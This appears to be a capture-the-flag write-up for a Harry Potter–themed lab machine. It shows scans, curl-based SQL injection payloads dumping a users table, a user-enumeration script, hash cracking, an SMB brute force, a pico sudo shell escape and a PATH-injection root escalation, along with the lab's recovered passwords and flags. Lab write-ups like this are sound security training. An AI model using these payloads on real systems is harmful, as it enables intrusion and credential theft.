# Objectives
* [x] User1.txt
* [x] User2.txt
* [ ] Root.txt
# IP
10.64.128.29
# Reconnaissance

``` sh
ping -c 2 10.64.128.29
PING 10.64.128.29 (10.64.128.29) 56(84) bytes of data.
64 bytes from 10.64.128.29: icmp_seq=1 ttl=62 time=188 ms
64 bytes from 10.64.128.29: icmp_seq=2 ttl=62 time=168 ms

--- 10.64.128.29 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 167.641/178.015/188.390/10.374 ms
```
# Ports scanning (TCP)

``` sh
sudo nmap -sS -sC -sV -p- --open -Pn -n 10.64.128.29

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 46:b6:77:8e:91:0b:43:91:b1:02:36:45:35:5e:17:6f (RSA)
|   256 98:68:99:80:c5:f8:7e:df:b7:af:74:2e:12:2a:59:80 (ECDSA)
|_  256 4e:d6:f2:05:28:d0:a3:46:0e:b7:d2:c8:3f:4a:cc:12 (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time:
|   date: 2026-09-25T18:41:35
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_clock-skew: -1s
|_nbstat: NetBIOS name: IP-10-64-128-29, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```
# Web enumeration

## Source code
Exploring at the source code in the index.html i found an interesting comment

``` html
<!-- 
	TODO: Virtual hosting is good. 
	TODO: Register for hogwartz-castle.thm 
-->
```
## Virtual hosting
With the hostname i can modify the hosts config

``` 
10.64.128.29	hogwartz-castle.thm
```

After modifying these 
![[Pasted image 20260925163525.png]]
## Dir fuzzing

``` sh
gobuster dir -u http://hogwartz-castle.thm/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,zip,txt,config,env                        
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hogwartz-castle.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,zip,txt,config,env
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
login                (Status: 405) [Size: 178]
static               (Status: 301) [Size: 327] [--> http://hogwartz-castle.thm/static/]
javascript           (Status: 301) [Size: 331] [--> http://hogwartz-castle.thm/javascript/]
logout               (Status: 302) [Size: 209] [--> http://hogwartz-castle.thm/]
```
## Login panel
After some simple tries like *admin:admin* *admin:password* and some other users enumerated in other services i found something interesting after trying a simple SQLI

``` sh
curl -X POST http://hogwartz-castle.thm/login --data="user=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271"
{"error":"The password for Lucas Washington is incorrect! contact administrator. Congrats on SQL injection... keep digging"}
```

These could be a potential user **Lucas Washington**
These also means we could code a script to enumerate users with these POST request
## Users enumeration with python script

``` python
import argparse
import sys
import requests

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True, help="login endpoint")
    ap.add_argument("-w", "--wordlist", required=True, help="username list")
    ap.add_argument("--userfield", default="username", help="form field for username")
    ap.add_argument("--passfield", default="password", help="form field for password")
    ap.add_argument("--password", default="x", help="dummy password to send")
    ap.add_argument("--valid-status", type=int, default=403, help="status that means 'valid user'")
    ap.add_argument("--valid-body", default=None, help="optional substring present only for valid users")
    ap.add_argument("--proxy", default=None, help="e.g. http://127.0.0.1:8080 for Burp")
    args = ap.parse_args()

    try:
        with open(args.wordlist) as fh:
            words = [ln.strip() for ln in fh if ln.strip()]
    except FileNotFoundError:
        sys.exit(f"[!] wordlist not found: {args.wordlist}")

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    s = requests.Session()          # keeps cookies across requests (session/CSRF)

    print(f"[*] Testing {len(words)} usernames against {args.url}")
    for i, user in enumerate(words, 1):
        data = {args.userfield: user, args.passfield: args.password}
        try:
            r = s.post(args.url, data=data, allow_redirects=False, timeout=10, proxies=proxies)
        except requests.RequestException as e:
            print(f"[!] {user}: {e}")
            continue

        hit = (r.status_code == args.valid_status)
        if args.valid_body:
            hit = hit or (args.valid_body in r.text)

        tag = "VALID" if hit else "     "
        print(f"[{tag}] {user:24s} -> {r.status_code}")

if __name__ == "__main__":
    main()
```

``` sh
python3 users-enumeration-login.py -u http://hogwartz-castle.thm/login -w spellnames.txt --userfield user --passfield password --password 123123
```

Unfortunately they all gave a 200 HTTP response status 
## SQL map

``` sh
sqlmap -u http://hogwartz-castle.thm/login \
  --data="user=test&password=test" \
  -p user \
  --technique=B \
  --code=403 \
  --level 3 --risk 3 \
  --batch
```

The DBMS is SQL Lite
## Union injection

``` sh
curl -s -X POST http://hogwartz-castle.thm/login \
  --data-urlencode "user=' UNION SELECT name,2,3,4 FROM sqlite_master WHERE type='table'-- -" \
  --data-urlencode "password=x"
{"error":"The password for users is incorrect! 4"}
```
Table **users** exists

``` sh
curl -s -X POST http://hogwartz-castle.thm/login \
  --data-urlencode "user=' UNION SELECT sql,2,3,4 FROM sqlite_master WHERE name='users'-- -" \
  --data-urlencode "password=x"
{"error":"The password for CREATE TABLE users(\nname text not null,\npassword text not null,\nadmin int not null,\nnotes text not null) is incorrect! 4"}
```
Columns are **name**, **password**, **admin**, **notes**

```sh
curl -s -X POST http://hogwartz-castle.thm/login \
  --data-urlencode "user=' UNION SELECT password,2,3,4 FROM users WHERE name='Lucas Washington'-- -" \
  --data-urlencode "password=x"
{"error":"The password for c53d7af1bbe101a6b45a3844c89c8c06d8ac24ed562f01b848cad9925c691e6f10217b6594532b9cd31aa5762d85df642530152d9adb3005fac407e2896bf492 is incorrect! 4"}
```
Found the password: **c53d7af1bbe101a6b45a3844c89c8c06d8ac24ed562f01b848cad9925c691e6f10217b6594532b9cd31aa5762d85df642530152d9adb3005fac407e2896bf492**
## John
To crac the hash 

``` sh
john --format=raw-sha512 --wordlist=./spellnames.txt hash.txt
john --format=raw-sha512 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Neither of them could find the password
## All registers
I need to keep enumerating the DB

``` sh
curl -s -X POST http://hogwartz-castle.thm/login \
  --data-urlencode "user=' UNION SELECT group_concat(name||':'||password||':'||admin||':'||notes),2,3,4 FROM users-- -" \
  --data-urlencode "password=x" \
  | python3 parse.py
USER                   ADMIN  HASH(first 16)          NOTES
--------------------------------------------------------------------------------------------------------
Lucas Washington       0      c53d7af1bbe101a6   contact administrator. Congrats on SQL injection...
Harry Turner           0      b326e7a664d756c3   My linux username is my first name, and password uses base64  ⚑ NOTE
Andrea Phillips        0      e1ed732e4aa925f0   contact administrator. Congrats on SQL injection...
Liam Hernandez         0      5628255048e956c9   contact administrator. Congrats on SQL injection...
Adam Jenkins           0      2317e58537e90014   contact administrator. Congrats on SQL injection...
Landon Alexander       0      79d9a8bef5756836   contact administrator. Congrats on SQL injection...
Kennedy Anderson       0      e3c663d68c647e37   contact administrator. Congrats on SQL injection...
Sydney Wright          0      d3ccca898369a3f4   contact administrator. Congrats on SQL injection...
Aaliyah Sanders        0      dc2a6b9462945b76   contact administrator. Congrats on SQL injection...
Olivia Murphy          0      6535ee9d2b8d6f24   contact administrator. Congrats on SQL injection...
Olivia Ross            0      93b4f8ce01b44dd2   contact administrator. Congrats on SQL injection...
Grace Brooks           0      9a311251255c8906   contact administrator. Congrats on SQL injection...
Jordan White           0      5ed63206a19b036f   contact administrator. Congrats on SQL injection...
Diego Baker            0      87ac9f90f01b4b2a   contact administrator. Congrats on SQL injection...
Liam Ward              0      88344d6b7724bc0e   contact administrator. Congrats on SQL injection...
Carlos Barnes          0      7f67af71e8cbb718   contact administrator. Congrats on SQL injection...
Carlos Lopez           0      8c8702dbb6de9829   contact administrator. Congrats on SQL injection...
Oliver Gonzalez        0      c809b40b7c3c0f09   contact administrator. Congrats on SQL injection...
Sophie Sanchez         0      68b519187b9e2552   contact administrator. Congrats on SQL injection...
Maya Sanders           0      7eea93d53fbed3ba   contact administrator. Congrats on SQL injection...
Joshua Reed            0      e49608634f7de91d   contact administrator. Congrats on SQL injection...
Aaliyah Allen          0      c063c5215b560913   contact administrator. Congrats on SQL injection...
Jasmine King           0      487daab566431e86   contact administrator. Congrats on SQL injection...
Jonathan Long          0      44b1fbcbcd576b8f   contact administrator. Congrats on SQL injection...
Samuel Anderson        0      a86fa315ce8ed4d8   contact administrator. Congrats on SQL injection...
Julian Robinson        0      a1f6e38be4bf9fd3   contact administrator. Congrats on SQL injection...
Gianna Harris          0      01529ec5cb2c6b03   contact administrator. Congrats on SQL injection...
Madelyn Morgan         0      d17604dbb5c92b99   contact administrator. Congrats on SQL injection...
Ella Garcia            0      ac67187c4d7e887c   contact administrator. Congrats on SQL injection...
Zoey Gonzales          0      134d4410417fb1fc   contact administrator. Congrats on SQL injection...
Abigail Morgan         0      afcaf504e02b57f9   contact administrator. Congrats on SQL injection...
Joseph Rivera          0      6487592ed88c043e   contact administrator. Congrats on SQL injection...
Elizabeth Cook         0      af9f594822f37da8   contact administrator. Congrats on SQL injection...
Parker Cox             0      53e7ea6c54bea76f   contact administrator. Congrats on SQL injection...
Savannah Torres        0      11f9cd36ed06f0c1   contact administrator. Congrats on SQL injection...
Aaliyah Williams       0      9dc90274aef30d1c   contact administrator. Congrats on SQL injection...
Blake Washington       0      4c968fc8f5b72fd2   contact administrator. Congrats on SQL injection...
Claire Miller          0      d4d5f4384c9034cd   contact administrator. Congrats on SQL injection...
Brody Stewart          0      36e2de7756026a8f   contact administrator. Congrats on SQL injection...
Kimberly Murphy        0      8f45b6396c0d993a   contact administrator. Congrats on SQL injection...
--------------------------------------------------------------------------------------------------------
Total users: 40
(⚑ ADMIN = admin=1; ⚑ NOTE = non-default note)
```

Where the python source code is
``` python
import re
import sys

DEFAULT_NOTE = "contact administrator. Congrats on SQL injection... keep digging"

def extract_dump(text):
    """Pull the blob out of the JSON wrapper if present."""
    m = re.search(r'The password for (.*?) is incorrect!', text, re.DOTALL)
    return m.group(1) if m else text

def parse(dump):
    """
    Split into records.
    A record is <name>:<128-hex>:<0|1>:<notes>.
    Records are comma-separated, BUT notes may contain commas, so we only
    split on commas that are followed by another <name>:<hash>:<admin>: run.
    """
    # comma followed by: name(no comma/colon) + ':' + 128 hex + ':' + digit + ':'
    rows = re.split(r',(?=[^:,]+:[0-9a-f]{128}:[01]:)', dump)

    users = []
    for row in rows:
        row = row.strip()
        if not row:
            continue
        parts = row.split(':', 3)      # name : hash : admin : rest
        if len(parts) != 4:
            users.append(('(unparsed)', row, '?', ''))
            continue
        name, h, admin, notes = parts
        users.append((name.strip(), h.strip(), admin.strip(), notes.strip()))
    return users

def main():
    text = None
    if len(sys.argv) > 1:
        with open(sys.argv[1]) as f:
            text = f.read()
    elif not sys.stdin.isatty():
        text = sys.stdin.read()

    if text is None:
        print("Paste the dump (or JSON) and press Ctrl-D, or pass a file/pipe stdin.")
        sys.exit(1)

    users = parse(extract_dump(text))

    print(f"{'USER':22} {'ADMIN':6} HASH(first 16)          NOTES")
    print("-" * 104)
    for name, h, admin, notes in users:
        flag = ""
        if admin == "1":
            flag += "  ⚑ ADMIN"
        if notes and notes != DEFAULT_NOTE:
            flag += "  ⚑ NOTE"
        print(f"{name:22} {admin:6} {h[:16]:18} {notes[:52]}{flag}")
    print("-" * 104)
    print(f"Total users: {len(users)}")
    print("(⚑ ADMIN = admin=1; ⚑ NOTE = non-default note)")

if __name__ == "__main__":
    main()
```
With these information i can try and login as harry with ssh once i crac his hash
## Harry's hash

``` sh
echo "b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885" > harry.txt
```

``` sh
john --format=raw-sha512 --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 harry.txt
wingardiumleviosa123
```
# Samba enumeration
## SMB map

``` sh
smbmap -H 10.64.128.29

[+] IP: 10.64.128.29:445	Name: 10.64.128.29        	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	sambashare                                        	READ ONLY	Harry's Important Files
	IPC$                                              	NO ACCESS	IPC Service (ip-10-64-128-29 server (Samba, Ubuntu))
```
## SMB client

Let's look at the share we can read
``` sh
smbclient //10.64.128.29/sambashare -N
```

``` sh
smb: \> ls
  .                                   D        0  Wed Nov 25 22:19:20 2020
  ..                                  D        0  Wed Nov 25 21:57:55 2020
  spellnames.txt                      N      874  Wed Nov 25 22:06:32 2020
  .notes.txt                          H      147  Wed Nov 25 22:19:19 2020
smb: \> get spellnames.txt
smb: \> get .notes.txt
smb: \> exit
```

```sh
cat .notes.txt
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
```

This hints us to try brute force with these users file
## Hydra

``` sh
hydra -L spellnames.txt -P /usr/share/wordlists/rockyou.txt 10.64.128.29 smb2 -u -F -vV -t 4
[445][smb2] host: 10.64.128.29   login: avadakedavra   password: 123456
```

We can enumerate further with these credentials
Unfortunately, i couldn't find more shares neither more users
# SSH
## Harry

``` sh
ssh harry@10.64.128.29
harry@10.64.128.29's password: wingardiumleviosa123
```
# User1 Flag

``` sh
cat user1.txt
RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}
```
### Privilege escalation

``` sh
sudo -l
(hermonine) /usr/bin/pico
(hermonine) /usr/bin/pico
```

``` sh
sudo -u hermonine /usr/bin/pico
^R^X
reset; sh 1>&0 2>&0
```
## Hermonine
# User2 Flag

``` sh
cat user2.txt
RME{p1c0-iZ-oLd-sk00l-nANo-64e977c63cb574e6}
```
### SSH key
To have permanent access to a nice shell let's create a ssh key

``` sh
ssh-keygen -t ed25519 -C "hermonine"
cat ~/.ssh/id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILzPZ+V4Oqq2J3q6YBW/5SVxBiiSp/lekL9pG/7SyUHj hermonine
```

``` sh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILzPZ+V4Oqq2J3q6YBW/5SVxBiiSp/lekL9pG/7SyUHj hermonine' > ~/.ssh/authorized_keys
```

```sh
ssh hermonine@10.64.128.29 -i ~/.ssh/id_25519
```
### Privilege escalation
#### SUID

``` sh
find / -perm -4000 2>/dev/null
/srv/time-turner/swagger
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/snap/core20/2501/usr/bin/chfn
/snap/core20/2501/usr/bin/chsh
/snap/core20/2501/usr/bin/gpasswd
/snap/core20/2501/usr/bin/mount
/snap/core20/2501/usr/bin/newgrp
/snap/core20/2501/usr/bin/passwd
/snap/core20/2501/usr/bin/su
/snap/core20/2501/usr/bin/sudo
/snap/core20/2501/usr/bin/umount
/snap/core20/2501/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2501/usr/lib/openssh/ssh-keysign
/snap/snapd/23771/usr/lib/snapd/snap-confine
```
There's an interesting file **/srv/time-turner/swagger**

When running it, it seems like a game to guess a number
``` sh
/srv/time-turner/swagger
Guess my number: 123123
Nope, that is not what I was thinking
I was thinking of 1816046252
```
Looking for readable strings
``` sh
strings /srv/time-turner/swagger
Nice use of the time-turner!
This system architecture is
uname -p
```
Apart from other thing we see the program calls uname
Since its not calling the absolute path i could try path injection

``` sh
cat > /tmp/uname << 'EOF'
> #!/bin/bash
> touch /tmp/test
> EOF
```

``` sh
chmod +x /tmp/uname
export PATH=/tmp:$PATH
```

But for this to run i have to guess the number right

``` sh
reveal=$(/srv/time-turner/swagger 2>&1 <<< "1")
num=$(echo "$reveal" | grep -oE '[0-9]+' | tail -1)
/srv/time-turner/swagger <<< "$num"
```

To see if this worked
``` sh
ls -l /tmp | grep test
-rw-rw-r-- 1 root      root         0 Sep 26 01:45 test
```

# Root Flag

``` sh
cat > /tmp/uname << EOF
> #!/bin/bash
> cat /root/root.txt > /tmp/root.txt
> EOF
```

``` sh
cat /tmp/root.txt
RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}
```